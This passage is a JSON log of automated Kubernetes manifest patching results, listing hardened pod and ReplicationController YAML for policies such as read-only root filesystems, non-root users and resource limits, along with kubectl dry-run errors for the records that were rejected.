[
  {
    "id": "00835",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:stable\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00836",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:stable\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00837",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:stable\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00838",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:stable\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00839",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:stable\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "00840",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"image-build-cron-trigger\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00841",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"image-build-cron-trigger\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00842",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: E1009 08:35:51.210072   74547 request.go:1196] \"Unexpected error when reading response body\" err=\"net/http: request canceled (Client.Timeout or context cancellation while reading body)\"\nerror: error validating \"STDIN\": error validating data: unexpected error when reading response body. Please retry. Original error: net/http: request canceled (Client.Timeout or context cancellation while reading body); if you choose to ignore these errors, turn validation off with --validate=false"
    ]
  },
  {
    "id": "00843",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: E1009 08:38:01.215644   74802 request.go:1196] \"Unexpected error when reading response body\" err=\"context deadline exceeded (Client.Timeout or context cancellation while reading body)\"\nerror: error validating \"STDIN\": error validating data: unexpected error when reading response body. Please retry. Original error: context deadline exceeded (Client.Timeout or context cancellation while reading body); if you choose to ignore these errors, turn validation off with --validate=false"
    ]
  },
  {
    "id": "00844",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: error validating \"STDIN\": error validating data: failed to download openapi: unknown; if you choose to ignore these errors, turn validation off with --validate=false"
    ]
  },
  {
    "id": "00845",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: error validating \"STDIN\": error validating data: Get \"https://127.0.0.1:55768/openapi/v2?timeout=32s\": context deadline exceeded (Client.Timeout exceeded while awaiting headers); if you choose to ignore these errors, turn validation off with --validate=false"
    ]
  },
  {
    "id": "00846",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"image-build-cron-trigger\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00847",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"image-build-cron-trigger\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00848",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"image-build-cron-trigger\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00849",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"image-build-cron-trigger\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00850",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo:stable\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00851",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo:stable\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00852",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo:stable\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00853",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo:stable\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00854",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo:stable\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00855",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00856",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00857",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00858",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00859",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00860",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"maskrcnn-image-seg\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00861",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"maskrcnn-image-seg\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00862",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"maskrcnn-image-seg\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00863",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"maskrcnn-image-seg\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00864",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"maskrcnn-image-seg\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "00865",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00866",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00867",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00868",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00869",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00870",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "errors": []
  },
  {
    "id": "00871",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "errors": []
  },
  {
    "id": "00872",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      readOnlyRootFilesystem: true\n      privileged: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      readOnlyRootFilesystem: true\n      privileged: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "errors": []
  },
  {
    "id": "00873",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      readOnlyRootFilesystem: true\n      privileged: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      readOnlyRootFilesystem: true\n      privileged: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "errors": []
  },
  {
    "id": "00874",
    "policy_id": "set_requests_limits",
    "accepted": true,
